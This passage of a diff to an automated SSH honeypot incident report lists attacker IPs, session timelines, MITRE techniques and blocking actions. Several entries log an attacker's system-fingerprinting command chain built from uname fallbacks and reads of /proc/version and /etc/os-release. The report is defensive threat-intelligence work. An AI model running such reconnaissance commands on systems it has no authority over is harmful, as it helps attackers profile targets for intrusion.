+| `2026-08-22 16:15:38` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:15:43` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `201.28.234[.]10` to AbuseIPDB if not already reported
+- [ ] Block `201.28.234[.]10` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-7a19adc89efb
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:16 |
+| **Last Seen** | 2026-08-22 16:16 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:16:10` | `cowrie.session.connect` |
+| `2026-08-22 16:16:11` | `cowrie.client.version` |
+| `2026-08-22 16:16:11` | `cowrie.client.kex` |
+| `2026-08-22 16:16:12` | `cowrie.login.success` |
+| `2026-08-22 16:16:13` | `cowrie.session.params` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.success` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.command.input` |
+| `2026-08-22 16:16:13` | `cowrie.log.closed` |
+| `2026-08-22 16:16:13` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-76c023057bc8
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `154.20.33[.]172` |
-| **First Seen** | 2026-08-22 13:23 |
-| **Last Seen** | 2026-08-22 13:23 |
-| **Session Duration** | 7s |
+| **First Seen** | 2026-08-22 16:17 |
+| **Last Seen** | 2026-08-22 16:17 |
+| **Session Duration** | 6s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
@@ -1603,12 +4076,12 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:23:10` | `cowrie.session.connect` |
-| `2026-08-22 13:23:10` | `cowrie.client.version` |
-| `2026-08-22 13:23:10` | `cowrie.client.kex` |
-| `2026-08-22 13:23:12` | `cowrie.login.success` |
-| `2026-08-22 13:23:13` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:23:17` | `cowrie.session.closed` |
+| `2026-08-22 16:17:19` | `cowrie.session.connect` |
+| `2026-08-22 16:17:20` | `cowrie.client.version` |
+| `2026-08-22 16:17:20` | `cowrie.client.kex` |
+| `2026-08-22 16:17:21` | `cowrie.login.success` |
+| `2026-08-22 16:17:21` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:17:26` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `154.20.33[.]172` to AbuseIPDB if not already reported
@@ -1617,54 +4090,13 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-47d5966ee5fa
+### 🔴 HIGH · IR-3ef9bed7dc68
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:23 |
-| **Last Seen** | 2026-08-22 13:23 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:23:15` | `cowrie.session.connect` |
-| `2026-08-22 13:23:15` | `cowrie.client.version` |
-| `2026-08-22 13:23:15` | `cowrie.client.kex` |
-| `2026-08-22 13:23:16` | `cowrie.login.success` |
-| `2026-08-22 13:23:17` | `cowrie.session.params` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.success` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:17` | `cowrie.command.input` |
-| `2026-08-22 13:23:18` | `cowrie.log.closed` |
-| `2026-08-22 13:23:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b205d919eacc
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.67.152[.]201` |
-| **First Seen** | 2026-08-22 13:23 |
-| **Last Seen** | 2026-08-22 13:23 |
+| **Source IP** | `103.171.39[.]147` |
+| **First Seen** | 2026-08-22 16:17 |
+| **Last Seen** | 2026-08-22 16:17 |
 | **Session Duration** | 8s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1675,27 +4107,58 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:23:18` | `cowrie.session.connect` |
-| `2026-08-22 13:23:19` | `cowrie.client.version` |
-| `2026-08-22 13:23:19` | `cowrie.client.kex` |
-| `2026-08-22 13:23:21` | `cowrie.login.success` |
-| `2026-08-22 13:23:22` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:23:27` | `cowrie.session.closed` |
+| `2026-08-22 16:17:27` | `cowrie.session.connect` |
+| `2026-08-22 16:17:27` | `cowrie.client.version` |
+| `2026-08-22 16:17:27` | `cowrie.client.kex` |
+| `2026-08-22 16:17:29` | `cowrie.login.success` |
+| `2026-08-22 16:17:30` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:17:35` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
-- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
+- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
+- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-f832ca8d9d59
+### 🔴 HIGH · IR-04b9251849ab
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:24 |
-| **Last Seen** | 2026-08-22 13:24 |
+| **Source IP** | `27.223.98[.]117` |
+| **First Seen** | 2026-08-22 16:17 |
+| **Last Seen** | 2026-08-22 16:17 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:17:31` | `cowrie.session.connect` |
+| `2026-08-22 16:17:32` | `cowrie.client.version` |
+| `2026-08-22 16:17:32` | `cowrie.client.kex` |
+| `2026-08-22 16:17:34` | `cowrie.login.success` |
+| `2026-08-22 16:17:35` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:17:39` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
+- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-45c032b10677
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:17 |
+| **Last Seen** | 2026-08-22 16:17 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1706,360 +4169,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:24:50` | `cowrie.session.connect` |
-| `2026-08-22 13:24:50` | `cowrie.client.version` |
-| `2026-08-22 13:24:50` | `cowrie.client.kex` |
-| `2026-08-22 13:24:51` | `cowrie.login.success` |
-| `2026-08-22 13:24:52` | `cowrie.session.params` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.success` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:52` | `cowrie.command.input` |
-| `2026-08-22 13:24:53` | `cowrie.log.closed` |
-| `2026-08-22 13:24:53` | `cowrie.session.closed` |
+| `2026-08-22 16:17:33` | `cowrie.session.connect` |
+| `2026-08-22 16:17:33` | `cowrie.client.version` |
+| `2026-08-22 16:17:33` | `cowrie.client.kex` |
+| `2026-08-22 16:17:34` | `cowrie.login.success` |
+| `2026-08-22 16:17:35` | `cowrie.session.params` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.success` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.command.input` |
+| `2026-08-22 16:17:35` | `cowrie.log.closed` |
+| `2026-08-22 16:17:35` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-199823191457
+### 🔴 HIGH · IR-9709c0242225
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:26 |
-| **Last Seen** | 2026-08-22 13:26 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:26:31` | `cowrie.session.connect` |
-| `2026-08-22 13:26:31` | `cowrie.client.version` |
-| `2026-08-22 13:26:31` | `cowrie.client.kex` |
-| `2026-08-22 13:26:32` | `cowrie.login.success` |
-| `2026-08-22 13:26:34` | `cowrie.session.params` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.success` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.command.input` |
-| `2026-08-22 13:26:34` | `cowrie.log.closed` |
-| `2026-08-22 13:26:34` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e6b1ef11a786
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:28 |
-| **Last Seen** | 2026-08-22 13:28 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:28:21` | `cowrie.session.connect` |
-| `2026-08-22 13:28:21` | `cowrie.client.version` |
-| `2026-08-22 13:28:21` | `cowrie.client.kex` |
-| `2026-08-22 13:28:21` | `cowrie.login.success` |
-| `2026-08-22 13:28:22` | `cowrie.session.params` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.success` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.command.input` |
-| `2026-08-22 13:28:22` | `cowrie.log.closed` |
-| `2026-08-22 13:28:22` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-86d98d3fea73
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:28 |
-| **Last Seen** | 2026-08-22 13:28 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:28:32` | `cowrie.session.connect` |
-| `2026-08-22 13:28:32` | `cowrie.client.version` |
-| `2026-08-22 13:28:32` | `cowrie.client.kex` |
-| `2026-08-22 13:28:33` | `cowrie.login.success` |
-| `2026-08-22 13:28:33` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:28:33` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:28:33` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:28:33` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-6f3d0ef78bf0
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:28 |
-| **Last Seen** | 2026-08-22 13:28 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:28:36` | `cowrie.session.connect` |
-| `2026-08-22 13:28:36` | `cowrie.client.version` |
-| `2026-08-22 13:28:36` | `cowrie.client.kex` |
-| `2026-08-22 13:28:37` | `cowrie.login.success` |
-| `2026-08-22 13:28:37` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:28:37` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:28:37` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:28:37` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-abe39cb5509f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:30 |
-| **Last Seen** | 2026-08-22 13:30 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:30:07` | `cowrie.session.connect` |
-| `2026-08-22 13:30:07` | `cowrie.client.version` |
-| `2026-08-22 13:30:07` | `cowrie.client.kex` |
-| `2026-08-22 13:30:08` | `cowrie.login.success` |
-| `2026-08-22 13:30:09` | `cowrie.session.params` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.success` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:09` | `cowrie.command.input` |
-| `2026-08-22 13:30:10` | `cowrie.log.closed` |
-| `2026-08-22 13:30:10` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-12089bfc33a7
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `208.96.233[.]67` |
-| **First Seen** | 2026-08-22 13:31 |
-| **Last Seen** | 2026-08-22 13:31 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:31:53` | `cowrie.session.connect` |
-| `2026-08-22 13:31:54` | `cowrie.client.version` |
-| `2026-08-22 13:31:54` | `cowrie.client.kex` |
-| `2026-08-22 13:31:55` | `cowrie.login.success` |
-| `2026-08-22 13:31:55` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:31:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
-- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3cebb36e758d
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:31 |
-| **Last Seen** | 2026-08-22 13:31 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:31:55` | `cowrie.session.connect` |
-| `2026-08-22 13:31:55` | `cowrie.client.version` |
-| `2026-08-22 13:31:55` | `cowrie.client.kex` |
-| `2026-08-22 13:31:56` | `cowrie.login.success` |
-| `2026-08-22 13:31:57` | `cowrie.session.params` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.success` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.command.input` |
-| `2026-08-22 13:31:57` | `cowrie.log.closed` |
-| `2026-08-22 13:31:58` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d26a12bb4591
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `63.135.169[.]175` |
-| **First Seen** | 2026-08-22 13:33 |
-| **Last Seen** | 2026-08-22 13:33 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:33:25` | `cowrie.session.connect` |
-| `2026-08-22 13:33:26` | `cowrie.client.version` |
-| `2026-08-22 13:33:26` | `cowrie.client.kex` |
-| `2026-08-22 13:33:27` | `cowrie.login.success` |
-| `2026-08-22 13:33:27` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:33:32` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
-- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b4a9abea4aac
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `81.215.2[.]43` |
-| **First Seen** | 2026-08-22 13:33 |
-| **Last Seen** | 2026-08-22 13:33 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:33:32` | `cowrie.session.connect` |
-| `2026-08-22 13:33:33` | `cowrie.client.version` |
-| `2026-08-22 13:33:33` | `cowrie.client.kex` |
-| `2026-08-22 13:33:34` | `cowrie.login.success` |
